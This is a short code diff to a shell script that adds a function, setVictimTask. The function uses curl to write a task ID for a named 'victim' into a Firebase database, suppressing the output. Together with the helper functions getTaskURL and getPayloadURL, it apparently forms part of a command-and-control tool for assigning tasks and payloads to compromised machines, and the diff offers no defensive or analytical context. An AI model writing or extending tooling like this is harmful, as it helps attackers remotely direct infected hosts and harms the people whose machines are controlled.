@@ -61,6 +61,23 @@ function getTaskURL() {
    | tr -d '"'
 }
 
+function setVictimTask() {
+  local victim="$1"
+  local taskID="$2"
+
+  if [ -z "$1" ] || [ -z "$2" ]; then
+    usage
+    exit 1
+  fi
+
+  local taskURL="`getTaskURL $taskID`"
+  if [  "$taskURL" == "null" ]; then
+    curl -X PUT -d "\"default\"" "https://${firebaseProject}.firebaseio.com/victims/$victim/task.json" &>/dev/null
+  else
+    curl -X PUT -d "\"$taskID\"" "https://${firebaseProject}.firebaseio.com/victims/$victim/task.json" &>/dev/null
+  fi
+}
+
 function getPayloadURL(){
   #echo "getPayloadURL: $1" >&2
   local url="$1"
